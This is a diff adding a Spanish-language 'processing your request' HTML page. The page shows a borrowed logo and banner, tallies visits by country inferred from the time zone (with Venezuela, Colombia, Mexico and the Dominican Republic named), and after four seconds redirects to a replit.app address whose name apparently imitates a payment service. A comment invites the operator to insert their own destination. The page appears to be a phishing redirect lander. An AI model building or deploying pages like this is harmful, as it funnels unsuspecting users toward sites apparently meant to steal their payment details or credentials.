@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando Solicitud...</title>
+    <style>
+        :root {
+            --azul-institucional: #0056b3;
+            --gris-claro: #f4f6f9;
+            --texto-oscuro: #333333;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--gris-claro);
+            color: var(--texto-oscuro);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Contenedor Principal (Optimizado para Mobile-First 360x740) */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .logo {
+            max-width: 180px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        .loader-container {
+            margin-bottom: 30px;
+        }
+
+        /* Reloj de arena animado con CSS moderno */
+        .hourglass {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            animation: rotateHourglass 2s infinite ease-in-out;
+        }
+        .hourglass:after {
+            content: " ";
+            display: block;
+            border-radius: 50%;
+            width: 0;
+            height: 0;
+            margin: 8px;
+            box-sizing: border-box;
+            border: 32px solid var(--azul-institucional);
+            border-color: var(--azul-institucional) transparent var(--azul-institucional) transparent;
+        }
+
+        .message {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--texto-oscuro);
+            line-height: 1.5;
+            margin-top: 20px;
+            padding: 0 10px;
+            animation: pulseText 1.5s infinite ease-in-out;
+        }
+
+        /* Banner Inferior */
+        .banner-container {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            margin-top: auto;
+        }
+
+        .banner {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Animaciones Modernas */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes rotateHourglass {
+            0% { transform: rotate(0); }
+            25% { transform: rotate(0); }
+            50% { transform: rotate(180deg); }
+            75% { transform: rotate(180deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseText {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/C1P23w0c/images.jpg" alt="Logo" class="logo">
+        </div>
+
+        <div class="loader-container">
+            <div class="hourglass"></div>
+            <p class="message">Estamos realizando la orden de solicitud...</p>
+        </div>
+    </div>
+
+    <div class="banner-container">
+        <img src="https://i.postimg.cc/RCt8s58g/inferior.jpg" alt="Banner" class="banner">
+    </div>
+
+    <script>
+        // Configuración del destino de redirección
+        const urlDestino = "https://ubiiapp-selectclients--ubiipag.replit.app/"; // Reemplaza por tu enlace de destino final
+        const tiempoEspera = 4000; // Tiempo en milisegundos (4 segundos)
+
+        // Función para registrar métricas locales sin servidor externo
+        function registrarFlujo() {
+            // Inicializar las variables en LocalStorage si no existen
+            let visitas = parseInt(localStorage.getItem('total_visitas')) || 0;
+            let redirecciones = parseInt(localStorage.getItem('total_redirecciones')) || 0;
+            let paises = JSON.parse(localStorage.getItem('datos_paises')) || {};
+
+            // Registrar el ingreso al index
+            visitas++;
+            localStorage.setItem('total_visitas', visitas);
+
+            // Detección de país ligera basada en el huso horario internacional del navegador
+            let paisDetectado = "Desconocido";
+            try {
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (tz) {
+                    if (tz.includes("Caracas")) paisDetectado = "Venezuela";
+                    else if (tz.includes("Bogota")) paisDetectado = "Colombia";
+                    else if (tz.includes("Mexico")) paisDetectado = "México";
+                    else if (tz.includes("Santo_Domingo")) paisDetectado = "República Dominicana";
+                    else {
+                        // Limpieza básica del texto para aislar la región/ciudad
+                        paisDetectado = tz.split('/')[1].replace('_', ' ');
+                    }
+                }
+            } catch (error) {
+                paisDetectado = "Desconocido";
+            }
+
+            // Añadir al contador del país correspondiente
+            if (!paises[paisDetectado]) {
+                paises[paisDetectado] = 0;
+            }
+            paises[paisDetectado]++;
+            localStorage.setItem('datos_paises', JSON.stringify(paises));
+
+            // Disparar la redirección tras expirar el contador de espera
+            setTimeout(() => {
+                redirecciones++;
+                localStorage.setItem('total_redirecciones', redirecciones);
+                window.location.href = urlDestino;
+            }, tiempoEspera);
+        }
+
+        // Ejecutar el script automáticamente al cargar la ventana
+        window.addEventListener('DOMContentLoaded', registrarFlujo);
+    </script>
+
+</body>
+</html>
